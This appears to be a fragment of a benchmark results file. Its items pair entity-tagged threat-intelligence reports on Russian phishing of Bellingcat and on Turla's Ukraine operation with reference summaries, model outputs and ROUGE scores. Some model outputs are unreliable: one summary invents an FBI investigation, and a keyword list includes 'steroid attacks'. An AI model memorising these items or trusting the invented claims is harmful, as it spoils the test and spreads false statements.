compromise for the malware samples, staging server, and command and control infrastructure. It advises organizations to review access to these to mitigate exposure. The adaptable nature of BRONZE PRESIDENT highlighted means entities in regions of interest to China should closely monitor for similar activity. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.5217391304347826, "gpt3/lexical/rouge_rouge2": 0.18075801749271136, "gpt3/lexical/rouge_rougeL": 0.2782608695652174, "gpt3/lexical/rouge_rougeLsum": 0.2782608695652174, "gpt3_generated_text": ["The article discusses the incident where the government-sponsored threat group BRONZE PRESIDENT, believed to be based in China, targeted Russian officials with an updated PlugX malware. This incident is thought to be a response to the war in Ukraine and the changing political landscape. The malware was disguised as a Russian-language document and used a decoy English-language document to deceive the victims. The malware downloaded several files from a staging server, including a DLL loader and a malicious payload, likely PlugX. The analysis also revealed the use of DLL search order hijacking and the ping command to delay the execution of the malware. This incident highlights the evolving intelligence collection requirements and cyber capabilities of countries in response to global events, political machinations, and motivations."]}, {"split_name": "test", "sample_id": "test_93", "prompt_text": "Extract the keywords: 2016/12/21Russia Hacks Bellingcat MH17 Investigation | ThreatConnectSEPTEMBER 28 , [CARDINAL] 2016Belling [ORG] the [ORG] BEARIN [ORG] BLOG , FEATURED ARTICLE , [LAW] RESEARCH [LAW] BY [LAW] THREATCONNECT [LAW] RESEARCH [LAW] TEAMThreatConnect reviews activity targeting [ORG] Bellingcat , a key contributor in the MH17 investigation . Read the full series of [ORG] ThreatConnect posts following the DNC Breach : \u201c Rebooting Watergate : Tapping into [ORG] the [ORG] Democratic [ORG] National [ORG] Committee [ url \u201d , \u201c [WORK_OF_ART] Shiny [WORK_OF_ART] Object ? [PERSON] Guccifer [CARDINAL] 2.0 and [ORG] the [ORG] DNC [ORG] Breach [ url \u201c , \u201c What \u2019s in a Name Server ? [ url \u201c , \u201c [WORK_OF_ART] Guccifer [WORK_OF_ART] 2.0 : the Man , the Myth , the Legend ? [ url \u201c , \u201c [WORK_OF_ART] Guccifer [WORK_OF_ART] 2.0 : All Roads Lead to [GPE] Russia [ url \u201c , \u201c FANCY BEAR Has an ( IT ) Itch that They Ca n\u2019t Scratch [ url \u201c , \u201c Does a BEAR Leak in the Woods ? [ url \u201c , and \u201c [WORK_OF_ART] Russian [WORK_OF_ART] Cyber [WORK_OF_ART] Operations [WORK_OF_ART] on [WORK_OF_ART] Steroids [ url \u201c .[UPDATE ] [DATE] October [DATE] 7th [DATE] 2016 [ /russia - hacks - bellingcat - mh17 - investigation#update]IntroductionSince posting about the [ORG] DNC hack [ url , each time we published a blog post on a [ORG] BEAR - based topic we thought it was going to be our last . But like the Death Star \u2019s gravitational pull , the story keeps drawing us back in as new information comes to light . Following our post on [ORG] DCLeaks as a [NORP] Russian in uence operation [ url , [PERSON] Bellingcat [ url founder [PERSON] Eliot [PERSON] Higgins [ url reached out to us . [PERSON] Bellingcat , a group of citizen investigative journalists , has published articles critical of [GPE] Russia and has been a key contributor to the international investigation of the shootdown of [NORP] Malaysian Airlines [PRODUCT] Flight [PRODUCT] 17 ( MH17 ) [ url over [GPE] Ukraine in [DATE] 2014.Higgins shared data with [ORG] ThreatConnect that indicates [ORG] Bellingcat has come under sustained targeting by [NORP] Russian threat actors , which allowed us to identify a [DATE] 2015 spearphishing campaign that is consistent with FANCY BEAR \u2019s tactics , techniques , and procedures . We also analyzed a [DATE] February [DATE] 2016 attack by [ORG] CyberBerkut \u2014 a group claiming to be pro - [NORP] Russian Ukrainian hacktivists but also a suspected front for [GPE] Moscow \u2014 against [GPE] Russia - based [ORG] Bellingcat contributor [PERSON] Ruslan [PERSON] Leviev [ url , where [ORG] CyberBerkut defaced the [ORG] Bellingcat website and leaked [PERSON] Leviev \u2019s personal details . As evidenced by these e orts and the attack on [FAC] the [FAC] World Anti - Doping [FAC] Agency [ url doping - agency - phishing/ ] , organizations that negatively impact [GPE] Russia \u2019s image can expect [NORP] Russian cyber operations intended to retaliate publicly or privately , in uence , or otherwise maliciously a ect them . The Diamond Model [ url below summarizes the activity that [ORG] Bellingcat [ORG] experienced.url [ORG] Hacks [ORG] Bellingcat [ORG] MH17 [ORG] Investigation [ORG] | [ORG] ThreatConnectClaim [ORG] Your [ORG] Free [ORG] AccountBellingcat [ORG] BackgroundBellingcat is a group of citizen investigative journalists \u2014 named after a classic fable [ url \u2014 that uses open source information , such as photos and videos posted on social media , maps , and publicly available satellite imagery . [PERSON] Bellingcat articles have focused on a variety of current events in [LOC] Africa , [LOC] the [LOC] Middle [LOC] East , the [GPE] U.S. , and [LOC] Europe with a speci c focus on notable con icts related to [GPE] Syria , [GPE] Ukraine , and [GPE] Russia . [PERSON] Bellingcat published its   rst post on [DATE] July [DATE] 5 , [DATE] 2014 , and for [DATE] the [DATE] next [DATE] twelve [DATE] days focused mainly on the ongoing [NORP] Syrian civil war , covering developments such as the use of chemical weapons , but also occasionally pointing out [NORP] Russian involvement . On [DATE] July [DATE] 17 , [DATE] 2014 , [ORG] Malaysian [ORG] Airlines [PRODUCT] Flight [PRODUCT] 17 crashed in pro - [NORP] Russian rebel territory in eastern [GPE] Ukraine and [PERSON] Bellingcat released their   rst post [ url mh17/ ] on the topic . Over [DATE] the [DATE] next [DATE] two [DATE] years , [ORG] Bellingcat would publish [CARDINAL] no [CARDINAL] fewer [CARDINAL] than [CARDINAL] 92 posts [ url from [CARDINAL] at [CARDINAL] least [CARDINAL] 8 contributors [ url focused on [NORP] Russian involvement in the downing of [PRODUCT] MH17 , using open source information and imagery to prove the presence of the [NORP] Russian military in eastern [GPE] Ukraine and that a [NORP] Russian - supplied [PERSON] Buk missile launcher shot down [CARDINAL] MH17 from pro - [NORP] Russian rebel territory . The [ORG] Kremlin vehemently denies this . The [NORP] Dutch took the lead in the criminal investigation through an international [ORG] Joint [ORG] Investigation [ORG] Team ( JIT ) [ url and o cially considered [ORG] Bellingcat \u2019s reporting in their investigation . [PERSON] Founder [PERSON] Eliot [PERSON] Higgins was included as an o cial witness . [ORG] The [ORG] Dutch [ORG] Safety [ORG] Board ultimately found [ url the - russians/ ] MH17 was shot down by a [NORP] Russian - made surface - to - air missile [ url but declined to assign blame for who was responsible for the launch . On [DATE] September [DATE] 28 , the [ORG] JIT is due to release [ url the results of their criminal investigation . Compromising Bellingcat contributors could provide [NORP] Russian intelligence services with journalists \u2019 contacts and sources , personal information , insight into future reporting perceived as indemnifying [GPE] Russia , as well as sensitive personal information . Such collection could facilitate in uence operations and retaliation e orts against [ORG] Bellingcat , or access that could be leveraged for follow - on operations . Compromising Bellingcat contributors \u2019 accounts could also provide access to communications with the [ORG] JIT , o ering a glimpse at how the investigation of the downing of MH17 was proceeding . Activity Targeting BellingcatTimelineThe timeline below summarizes the notable dates related to the [PRODUCT] MH17 crash and investigation , [ORG] Bellingcat \u2019s articles related to those events , and the malicious activity targeting [PERSON] Bellingcat and [GPE] Leviev . It \u2019s important to note we do not have complete insight intourl Hacks Bellingcat MH17 Investigation | ThreatConnectall of the malicious activity that may have targeted [PERSON] Bellingcat during this timeframe . Claim Your Free AccountFANCY BEARFrom [DATE] February [DATE] 2015 [DATE] to [DATE] July [DATE] 2016 [CARDINAL] three researchers at [ORG] Bellingcat \u2014 [PERSON] Higgins , [PERSON] Aric [PERSON] Toler , and Veli - Peka [ORG] Kivimaki \u2014 who had contributed MH17 articles received numerous spearphishing emails , with [PERSON] Higgins alone receiving [CARDINAL] at [CARDINAL] least [CARDINAL] 16 phishing emails targeting his personal email account . A majority of the campaign took place from [DATE] February [DATE] to [DATE] September [DATE] 2015 , with some activity resuming in [DATE] May [DATE] 2016 . These spearphishing attempts consist of a variety of spoofed [PERSON] Gmail security notices alerting the target that suspicious activity was detected on their account . The target is prompted to click a URL resembling a legitimate [PERSON] Gmail security link to review the details of this suspicious activity . Below are screenshots of some of the spearphishing email targeting [ORG] Bellingcat [ORG] researchers.url [ORG] Hacks [ORG] Bellingcat [ORG] MH17 [ORG] Investigation [ORG] | [ORG] ThreatConnectClaim [ORG] Your [ORG] Free AccountThe attackers used several methods to redirect the target to credential harvesting pages . In [CARDINAL] at [CARDINAL] least [CARDINAL] 21 of the emails , the URL redirects the victim to a shortened Bitly URL . These shortened Bitly links , in turn , direct the victim to another Google - spoo ng URL appended with the base64 [ url encoded target email and name . [CARDINAL] One of the emails used a shortened TINYCC URL to achieve the same e ect . In [CARDINAL] four of the other emails , the security links direct the target to a Google Sites page that spoofs a [ORG] Google login page . Once the target visits the Bitly , TINYCC , or Google Sites URLs , they are prompted to enter their Google credentials , which would then be captured by the threat actors . The speci cally crafted URLs with target - speci c strings are consistent with a FANCY BEAR technique highlighted in [ORG] Dell [ORG] Secureworks research [ url and employed against a [ORG] DNC sta er [ url whose   les were leaked on [ORG] DCLeaks . Reviewing the click information for the Bitly links , we identi ed that [CARDINAL] at [CARDINAL] least [CARDINAL] three of the Bitly URLs targeting the same [ORG] Bellingcat individual were accessed in the timeframe consistent with the spearphishing attack . This suggests the individual clicked on the links in [CARDINAL] three of the spearphishing messages , but [PERSON] Bellingcat con rms that no credentials were supplied to these pages . Other consistencies with [GPE] Russia and FANCY BEAR activity were also identi ed . In [DATE] early [DATE] May and again in mid - [DATE] June [DATE] 2016 the [ORG] Bellingcat contributor [PERSON] Aric [PERSON] Toler \u2019s personal email address was targeted by FANCY BEAR . Using [ORG] ThreatConnect \u2019s [ORG] Email [ORG] Import function , we are able to identify that both messages abused [GPE] Moscow - based [ORG] Yandex email services to send malicious emails to the researcher . In the [DATE] May phishing example FANCY BEAR used the Yandex account berg01berg01@yandex[.]com.url [PERSON] Hacks [PERSON] Bellingcat [PERSON] MH17 [PERSON] Investigation [PERSON] | [PERSON] ThreatConnectClaim [PERSON] Your [PERSON] Free AccountIn the [DATE] June [DATE] 2016 example , [PERSON] Toler was targeted with a message that used hellomail1@yandex[.]com in a manner consistent [ url with how [PERSON] Billy [PERSON] Rinehart was targeted prior to content from his personal [PERSON] Gmail being posted to [ORG] DCLeaks . By analyzing the email headers provided by [PERSON] Bellingcat , we identi ed domains and corresponding [ORG] IP addresses that the attackers leveraged as part of the spearphishing operation . The table below also shows the registrant for the domain , the creation date for [ url les / tactical - intelligence - bulletin --- sofacy - phishing-.pdf ] by [PERSON] Pricewaterhouse [PERSON] Coopers as FANCY BEAR , and the domain servicetransfermail[.]com closely resembles the [ORG] servicetransferemail[.]com infrastructure that [NORP] German Intelligence ( BvF ) established as FANCY BEAR within [PERSON] Cyber [PERSON] Brief [PERSON] Nr . [CARDINAL] 01/2016 [ url 03-bfv-cyber-brief-2016-01.pdf ] .FANCY [ORG] BEAR also previously used both the [GPE] Cata501836 [ url and [ORG] Carbon2u name servers to host infrastructure and email addresses from 1&1 \u2019s mail.com to register domains [ url . We were able to identify further overlaps with other FANCY BEAR infrastructure by pivoting o   of these indicators , which we will describe in a later blog post . Based on these consistencies , we assess FANCY BEAR almost certainly is behind the spearphishing and credential harvesting campaign targeting [PERSON] Eliot [PERSON] Higgins and other [ORG] Bellingcat researchers . [ORG] CyberBerkut ActivityCyberBerkut describes itself as a group of pro - [NORP] Russian Ukrainian hacktivists . They borrow the \u201c [PERSON] Berkut [ url \u201d name from the now disbanded [NORP] Ukrainian riot police who responded brutally to the [DATE] 2014 [ORG] EuroMaidan [ url ix.com/title/80031666 ] demonstrations in [GPE] Kiev . [ORG] CyberBerkut runs a digitally- fueled , aggressive , active measures [ url campaign directed against a pro - western government in [GPE] Kiev and points of western in uence \u2014 such as [ORG] NATO \u2014 in eastern [LOC] Europe . [ORG] CyberBerkut has conducted attacks across a spectrum of technical sophistication including distributed denial of service attacks ( DDOS ) , disrupting and degrading the networks of [ORG] Ukraine \u2019s [ORG] Central [ORG] Election [ORG] Commission [ url les / multimedia / pdf / CyberWarinPerspective_full_book.pdf ] during the [DATE] 2014 election , hacking [NORP] Ukrainian billboards [ url and displaying pro - [NORP] Russian messages , conducting computer network exploitation and strategic leaks of emails and documents , and leaking intercepted phone calls between high ranking [GPE] Ukrainian [ url o cials . This range suggests highly capable actors are behind [ORG] CyberBerkut and they employ a high degree of operational planning when considering the o ensive use of information and their e ects . [ORG] CyberBerkut defaced [ url the [PERSON] Bellingcat webpage on [DATE] February 10 , [DATE] 2016 , claiming credit for the attack and singling out [PERSON] Ruslan [PERSON] Leviev , a [NORP] Russian opposition blogger and [PERSON] Bellingcat contributor.url Hacks Bellingcat MH17 Investigation | ThreatConnectClaim Your Free AccountLeviev published a compelling piece [ url of citizen journalism on [DATE] May 22 , [DATE] 2015 exploring the fate of [NORP] Russian [NORP] Spetsnaz soldiers believed to have been killed in combat operations within [GPE] Ukraine [DATE] earlier [DATE] that [DATE] month . According to [ORG] Bellingcat founder [PERSON] Higgins , [ORG] Leviev \u2019s contributor account was compromised and used to post the [PRODUCT] CyberBerkut message . In an email interview , [PERSON] Leviev makes the following statement regarding the events that led to the compromise of his credentials and the defacement . In my case , my old email account , which was located on Yandex servers , was hacked . The email account had a long , di cult password , not a word , from various letters , numbers , and special symbols . Plus there was a telephone number bound to the account for [ORDINAL] second factor authentication . Exactly how it was hacked \u2014 I do n\u2019t know . Either they as employees , or with their active assistance , intercepted the [ORG] SMS authentication code . Or they , again , as an o cer from the authorities or with their active assistance , gained direct access to the Yandex Mail servers where they seized the email from my old inbox . Or they know about a vulnerability in Yandex email that nearly nobody else knows about.\ue879\ue879\ue879Having seized the old email inbox , they used the password recovery mechanism for [ORG] LiveJournal . My LiveJournal account ( which I have not used for a long time ) was connected to my old email address , but [ORG] LiveJournal does not provide [ORDINAL] second factor authentication . Via password recovery of my LiveJournal from my stolen email , they took over my LiveJournal account and made a post . In the same stolen email account , they found my username and password for my account at [ORG] Bellingcat ( I had once published an investigation directly on the [PERSON] Bellingcat website ) and they published a post there in my name . At the same time , my icloud account was not setup for [ORDINAL] second factor authentication , and was connected only to my old email address for password recovery , it was also taken over . They performed a password recovery via my stolen email address for icloud , logged in , but I received a noti cation on my [ORG] iPhone about it , and I quickly cut o   their access , but they were able to download some photos . They also tried to hack my Facebook and Twitter . They were unable to crack Facebook , because I had [ORDINAL] second factor authentication and always need to enter the code generated by the Facebook app . They were able to login to [PRODUCT] Twitter and change the password but nothing was deleted and they did n\u2019t tweet anything . I restored the password . Based on all the data , I assume that , as in the case of [LOC] Alburovym , [PERSON] Kozlovsky , [PERSON] Parkhomenko , this was the activity of security services who intercepted the SMS containing the access code . So they got access to my old email account and they also gained access to my Twitter account ( which was also under [CARDINAL] two - factor , but code is sent via SMS rather than generated in an app).Of my social networks where [CARDINAL] two - factor codes are generated via an application , they were unable to crack . Of my social networks where the [CARDINAL] two - factor code was sent via SMS , they were able to crack.url Hacks Bellingcat MH17 Investigation | ThreatConnectLeviev suggests the attackers had direct access to Yandex mail servers or were able to intercept the SMS message used for [CARDINAL] two factor authentication to compromise his old Yandex email account . Leviev goes on to describe that the actors then used emails [WORK_OF_ART] Claim [WORK_OF_ART] Your [WORK_OF_ART] Free [WORK_OF_ART] Account from that old account to compromise his iCloud account and access pictures and other information saved from [GPE] Leviev \u2019s phone to [PERSON] iCloud . Some of this information was ultimately put in a [DATE] February 24 , [DATE] 2016 post on [ORG] CyberBerkut \u2019s website that contained sensitive details of [GPE] Leviev \u2019s personal life , such as his pictures , phone number , address , passport scan , girlfriend \u2019s name , and dating and sexual preferences . These attacks were an overt attempt to discredit [PERSON] Bellingcat research and [ORG] Leviev , but also carried a message to others who publicly voice positions critical of [GPE] Moscow that this form of journalism does not go unnoticed . We also found it interesting how much e ort was expended and the degree of sources and methods exposed to achieve a simple defacement . We do not know whether the attackers intercepted [GPE] Leviev \u2019s SMS - based [CARDINAL] two - factor authentication or had direct access to Yandex mail servers , but either tactic is more suggestive of a state - backed actor as opposed to independent hacktivists . [ORG] CyberBerkut and FANCY BEAR : Not the Same , But Showing Up to the Same PartyThroughout our research , we have focused on FANCY BEAR , an advanced persistent threat ( [ORG] APT ) group assessed to be [NORP] Russian government . [ORG] CyberBerkut , on the other hand , was a referential data point when we looked at precedence for pro - [NORP] Russian proxies interfering with elections . [ORG] CrowdStrike assessed in its [DATE] 2015 [EVENT] Global [EVENT] Threat [EVENT] Report [ url [CARDINAL] 266 / images/15GlobalThreatReport.pdf ] \u201c there are indications that [ORG] CyberBerkut has ties to [NORP] Russian state security , \u201d but the degree of [NORP] Russian government control over the group is disputed . The timing of the FANCY BEAR spearphishing campaigns and the [ORG] CyberBerkut attack against [GPE] Leviev are interesting . The concerted FANCY BEAR spearphishing e orts over a [DATE] six [DATE] month timeframe in [DATE] 2015 shows [GPE] Moscow \u2019s clear intent to compromise [ORG] Bellingcat , most likely due to their posts on key current events involving [GPE] Russia . This activity was followed by a hard stop and then additional targeted e orts by [ORG] CyberBerkut in [DATE] early [DATE] 2016 , which was in - turn followed by additional FANCY BEAR spearphishing from [DATE] May [DATE] to [DATE] July [DATE] 2016 . A key assumption underlying any assessment about how these activities are related stems from how an analyst assesses the motives for targeting [GPE] Leviev . We came up with [CARDINAL] two scenarios : Stronger / Closer [ORG] Coordination [ORG] Between [ORG] FANCY [ORG] BEAR and [ORG] CyberBerkut . In this scenario , the activities against [ORG] Bellingcat are coordinated with these [CARDINAL] two entities handing o   operations . The timing suggests that the state actors , looking to compromise [ORG] Bellingcat , pivoted to a more aggressive attack against [GPE] Leviev when the initial spearphishing campaign failed to yield the desired results . [PERSON] Leviev is targeted more aggressively as a means to get at [ORG] Bellingcat and since he lives in [GPE] Russia , state actors would have additional tools in their kit to intercept his SMS [CARDINAL] two - factor authentication messages or gain direct access to Yandex \u2019s mail servers . In this scenario , [PRODUCT] CyberBerkut functions as much as a strategic messaging outlet as the actual attacker and is subject to a much greater degree of direction and control from [GPE] Moscow than previously assessed . The Common Enemies Approach : Weaker / Less Coordination Between FANCY BEAR and [ORG] CyberBerkut . In this scenario , the spearphishing campaigns conducted by FANCY BEAR are distinct in purpose and perpetrator from the [PRODUCT] CyberBerkut attack against [GPE] Leviev . The spearphishing campaigns are more focused on [GPE] Bellingcat \u2019s coverage of the [PRODUCT] MH17 shootdown and involvement in the [ORG] JIT investigation . [ORG] CyberBerkut targets [ORG] Leviev separately after his coverage of [NORP] Russian military involvement in eastern [GPE] Ukraine with some assistance from supportive friends in [GPE] Moscow to compromise his Yandex account . [PERSON] Targeting [PERSON] Leviev is less about a broader compromise of [ORG] Bellingcat and more about harassing [CARDINAL] one journalist . In this scenario , [ORG] CyberBerkut is advancing [GPE] Moscow \u2019s interests and can call on the [NORP] Russian intelligence services , but is still a distinct group . [PERSON] Leak [PERSON] Sites Leaking OverWe looked to see if we could identify other overlaps between FANCY BEAR and [ORG] CyberBerkut that would help us assess which of these [CARDINAL] two scenarios was more likely . Through our research into the [ORG] Bellingcat activity , we found some surprising content overlaps with [ORG] DCLeaks \u2014 another assessed [NORP] Russian in uence outlet \u2014 and a [ORG] CyberBerkut pattern of registering infrastructure that FANCY BEAR also uses . These developments move the needle slightly towards a more coordinated relationship between the [CARDINAL] two groups , but not decisively . [PERSON] Comparing [PERSON] DCLeaks and CyberBerkutIn our previous post [ url , we identi ed a website called [ORG] DCLeaks as a [NORP] Russian - backed in uence outlet . Information shared with [ORG] ThreatConnect indicates that there is an association of some kind between the [PERSON] Guccifer 2.0 persona and the [ORG] DCLeaks website . Shortly after publication , we became aware of a cache of documents leaked on the [ORG] DCLeaks site . The   les were allegedly obtained via a compromise of an organization a liated with [PERSON] George [PERSON] Soros . It is interesting to note that earlier in [DATE] 2016 [ORG] CyberBerkut also published   les purportedly associated with [ORG] Soros.url [ORG] Hacks [ORG] Bellingcat [ORG] MH17 [ORG] Investigation [ORG] | [ORG] ThreatConnectAnalysis conducted by [PERSON] Anton [PERSON] Cherepanov [ url , a security researcher who works for ESET , suggests that the content of the [CARDINAL] two leaks are similar with [CARDINAL] at [CARDINAL] least [CARDINAL] three of the [PERSON] Soros documents [ url being found on both sites . The acquisition and publication of documents belonging to , or in some way associated with , the same individual is of interest as overlaps in targeting and potential similarities in stolen content could be indicative of a connection between [ORG] DCLeaks and [ORG] CyberBerkut . Further , as we have identi ed that there is a connection from [ORG] DCLeaks to [PERSON] Guccifer [CARDINAL] 2.0 and from [PERSON] Guccifer [CARDINAL] 2.0 to FANCY BEAR , the overlap in leaked documents may suggest that both leak sites obtained their data from the same collection source , FANCY BEAR.Claim Your Free AccountWhile this alone is n\u2019t enough to verify a relationship between the sites , there are some other interesting similarities . Despite their statuses as a U.S.-focused whistleblower and hacktivist group respectively , the websites of both [ORG] DCLeaks and [ORG] CyberBerkut primarily host content that is critical of individuals and governments perceived to oppose [NORP] Russian foreign and domestic policies . Both sites attempt to appeal to civilian masses in the [GPE] U.S. and [GPE] Ukraine respectively by calling attention to purported in the political systems . [ORG] Aleksandr PanchenkoCyberBerkut \u2019s main domain , cyber - berkut[.]org , was registered using privacy protection through the registrar Internet.bs and shortly thereafter hosted using [ORG] CloudFlare infrastructure . Several other [ORG] CyberBerkut - related domains redirect to this website . Most of these domains were also registered using privacy protection , but [CARDINAL] one domain , cyber - berkut[.]net was registered by \u201c Aleksandr Panchenko \u201d using the email address alex_panchenko@mail[.]com . [DATE] The [DATE] same [DATE] day the domain was registered through Reg.ru , it was later routed to [ORG] CloudFlare infrastructure , suggesting that this domain was not opportunistically procured by a domain registrant in hopes they could sell it to the [ORG] CyberBerkut actors . Additional research into this name and email address identi es [CARDINAL] six other [ORG] CyberBerkut - related domains , none of which are active currently , registered by this individual : Cyber - berkut[.]suCyber - berkut[.]tkCyber - berkut[.]usCyber - berkut[.]meCyber - berkut[.]czCyber - berkut[.]im\ue879\ue879\ue879\ue879\ue879\ue879While certainly not de nitive , the use of a [ORG] mail.com email address to register domains is consistent with recently identi ed FANCY BEAR registration activity against the DCCC [ url , [ORG] WADA , and [ORG] CAS [ url .Tracing out FB Infrastructure Based on [PERSON] Bellingcat [PERSON] InputThe activity that [PERSON] Bellingcat alerted us to provided a plethora of domains , [ORG] IP addresses , email addresses , and other registration and hosting information for us to pivot o   of to identify other pertinent infrastructure . In an upcoming blog post , we \u2019ll seek to identifyurl Hacks Bellingcat MH17 Investigation | [ORG] ThreatConnectas much FANCY BEAR infrastructure and aliases as possible using the [ORG] ThreatConnect platform and capabilities from some of our industry partners . Claim Your Free AccountReviewing the CATA501836 and [ORG] Carbon2u name servers , we were able to identify [CARDINAL] dozens of active domains that   t the FANCY BEAR mold and likely spoof organizations that [GPE] Moscow would seek to compromise . Pivoting o   of Bellingcat \u2019s email headers we were able to identify [CARDINAL] hundreds of domains and IPs , and [CARDINAL] dozens of email addresses and aliases most likely used by FANCY BEAR , some of which were not previously identi ed . This review primarily identi ed historical FANCY BEAR information , but the conclusions from it help verify FANCY BEAR TTP assessments , provide additional targeting context , and may be useful in retrospective reviews of malicious activity . [ORG] ConclusionThe campaign against [ORG] Bellingcat provides yet another example of sustained targeting against an organization that shines a light on [NORP] Russian per dy . The spearphishing campaign is classic FANCY BEAR activity while [ORG] CyberBerkut \u2019s role raises yet more questions about the group \u2019s ties to [GPE] Moscow . These end - to - end cyber operations begin with targeting and exploitation and end with strategic leaks and other active measures employed against those with whom they disagree . These e orts go above and beyond traditional intelligence requirements such as gaining insight into a sensitive project or sources . Vilifying the messenger and dumping their personal data is part of the game , intended to intimidate and embarrass those that speak ill of [GPE] Moscow . If [GPE] Russia is willing to go to these lengths to compromise a small journalist organization and its contributors , consider what they are willing to do to major news and media outlets that publish similar articles . While many organizations remain reticent to share information , this knowledge is the prerequisite to establishing how widespread such e orts are and the adversary \u2019s modus operandi . The BEARs win if their active measures campaigns push , scare , or intimidate their targets into doing what they want . If you encounter a [ORG] BEAR , you \u2019re doing something right . Do n\u2019t back down . And turn on [CARDINAL] two - factor authentication for everything . [ORG] UpdateOn [DATE] October [DATE] 5 [DATE] 2016 , probable FANCY BEAR actors again sent a spearphishing message to a [ORG] Bellingcat contributor . This spearphishing message spoofed Google security services , similar to those previously used to target [ORG] Bellingcat.url Hacks Bellingcat MH17 Investigation | ThreatConnectClaim Your Free AccountFANCY BEAR used a shortening service to mask the malicious link , similar to the previous messages , but it appears the actors attempted to obfuscate their activity by using [CARDINAL] two separate shortening services to hide the   nal malicious link . The tiny.cc link that is in the spearphishing message actually points to a TinyURL shortened URL.The TinyURL in turn points to the below URL : hxxp://myaccount.google.com - changepassword - securitypagesettingmyaccountgooglepagelogin.id833[.]gaThis URL is appended with a target - speci c base64 encoded string as was seen in the previous spearphishing messages targeting [PERSON] Bellingcat and others.url Hacks Bellingcat MH17 Investigation | ThreatConnectClaim Your Free AccountThe id833[.]ga domain is hosted at the 89.40.181[.]119 IP ( Bucharest , RO ) which also hosts the domain id834[.]ga . There is a subdomain for the id834[.]ga similar to the URL above that is also hosted at the same [ORG] IP . This suggests that the id834[.]ga domain has also been operationalized , though we have no information indicating who has been targeted with it . The [ORG] WHOIS records for these domains did not contain any additional information on the registrants or other domains they may have registered . Using [ORG] ThreatConnect \u2019s [ORG] Email [ORG] Import feature , we identi ed that the spearphishing message was sent through Yandex mail servers using the email address g.mail2017@yandex[.]com . This was the   rst identi ed spearphish against [ORG] Bellingcat since [DATE] July [DATE] 2016 and suggests that FANCY BEAR activity against them is ongoing . Other organizations involved in the MH17 investigation that would draw [GPE] Moscow \u2019s ire should be on the lookout for similar activity . Categories : Blog , [PERSON] Featured [PERSON] Article , ResearchA B O U T T H E A U T H O Rurl Hacks Bellingcat MH17 Investigation | ThreatConnectClaim Your Free AccountThe ThreatConnect Research Team : is an elite group of globally - acknowledged cybersecurity experts , dedicated to tracking down existing and emerging cyber threats . We scrutinize trends , technology and socio - political motivators to develop comprehensive knowledge of the cyber landscape . Then , we share what we \u2019ve learned so that you can protect your organization , and your team can take precise action against threats . SIGN UP FOR ACCOUNTSIGN UP NOWurl", "generated_text": "ThreatConnect; a Russian; Bellingcat; the MH17 investigation; 2015; spearphishing campaigns; FANCY BEAR; techniques; procedures; a February 2016 attack; CyberBerkut; pro-Russian Ukrainian hacktivists; a suspected front; Moscow; cyber operations; retaliation; publicly; private; uence; steroid attacks; The Diamond Model; the attacks; detail; the C&C; the FBI; the investigation; the attack; The Diamond Model; targets; organizations; the threat actor; groups; the investigation.", "ref_text": "<START-1>The report details cyber attacks by Russian threat actors against Bellingcat, an investigative journalism group that has published extensively on the downing of Malaysia Airlines Flight 17 (MH17) over Ukraine in 2014. Bellingcat was targeted by spearphishing campaigns attributed to FANCY BEAR, a Russian advanced persistent threat group, from 2015-2016. The phishing emails spoofed Gmail security notifications and used shortened URLs to harvest credentials from Bellingcat researchers. In February 2016, the pro-Russian hacktivist group CyberBerkut compromised Bellingcat contributor Ruslan Leviev's email and accounts, defaced the Bellingcat website, and leaked his personal information. Leviev believes his SMS-based two-factor authentication was intercepted to access his Yandex email account. The report examines potential connections between FANCY BEAR and CyberBerkut based on similarities in infrastructure and targeting. Overlaps were found between documents leaked by CyberBerkut and the site DCLeaks, which has links to FANCY BEAR. The attacks are seen as retaliation for Bellingcat's reporting on the MH17 investigation implicating Russia. The report stresses that organizations publishing negative content about Russia can expect cyber operations intended to intimidate, influence or retaliate against them. It advises enabling two-factor authentication as a defense. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.43450479233226835, "gpt3/lexical/rouge_rouge2": 0.1157556270096463, "gpt3/lexical/rouge_rougeL": 0.20447284345047922, "gpt3/lexical/rouge_rougeLsum": 0.20447284345047922, "gpt3_generated_text": ["The article discusses the targeting of Bellingcat, a key contributor in the MH17 investigation, by Russian threat actors. ThreatConnect, a cybersecurity company, reviewed the activity and found evidence of a spearphishing campaign in 2015 that is consistent with the tactics of FANCY BEAR, a Russian hacking group. The article also mentions a February 2016 attack by CyberBerkut, a group claiming to be pro-Russian Ukrainian hacktivists but suspected to be a front for Moscow. The attacks on Bellingcat and other organizations that negatively impact Russia's image are seen as retaliation or influence operations. The Diamond Model is used to summarize the activity and targets of the attacks. The article highlights the ongoing investigation by the FBI into the attacks."]}, {"split_name": "test", "sample_id": "test_94", "prompt_text": "Extract the keywords: www.mandiant.com /resources / blog / turla - galaxy - opportunity [PERSON] Turla : A Galaxy of OpportunityWarning : An indicator within this post contains offensive language . In [DATE] September [DATE] 2022 , [ORG] Mandiant discovered a suspected [PERSON] Turla [PERSON] Team operation , currently tracked as [ORG] UNC4210 , distributing the [ORG] KOPILUWAK reconnaissance utility and QUIETCANARY backdoor to [ORG] ANDROMEDA malware victims in [GPE] Ukraine . Mandiant discovered that UNC4210 re - registered [CARDINAL] at [CARDINAL] least [CARDINAL] three expired ANDROMEDA command and control ( C2 ) domains and began profiling victims to selectively deploy [ORG] KOPILUWAK and [GPE] QUIETCANARY in [DATE] September [DATE] 2022.ANDROMEDA was a common commodity malware that was widespread in the early 2010 \u2019s . The particular version whose [CARDINAL] C2 was hijacked by [ORG] UNC4210 was first uploaded to [ORG] VirusTotal in [DATE] 2013 and spreads from infected [ORG] USB keys . Mandiant Managed Defense continues to observe ANDROMEDA malware infections across a wide variety of industries , however , [ORG] Mandiant has only observed suspected [GPE] Turla payloads delivered in [GPE] Ukraine . Figure [CARDINAL] 1 : Timeline of ANDROMEDA to [ORG] Turla [ORG] Team intrusionUSB [ORG] SpreadingAs [ORG] Mandiant recently wrote about in our blog post , Always [WORK_OF_ART] Another Secret : [WORK_OF_ART] Lifting [WORK_OF_ART] the [WORK_OF_ART] Haze [WORK_OF_ART] on China - nexus [WORK_OF_ART] Espionage in [LOC] Southeast [LOC] Asia , [ORG] USB spreading malware continues to be a useful vector to gain initial access into organizations . In this incident , a [ORG] USB infected with several strains of older malware was inserted at a [NORP] Ukrainian organization in [DATE] December [DATE] 2021 . When the system 's user double clicked a malicious link file ( [ORG] LNK ) disguised as a folder within the [ORG] USB 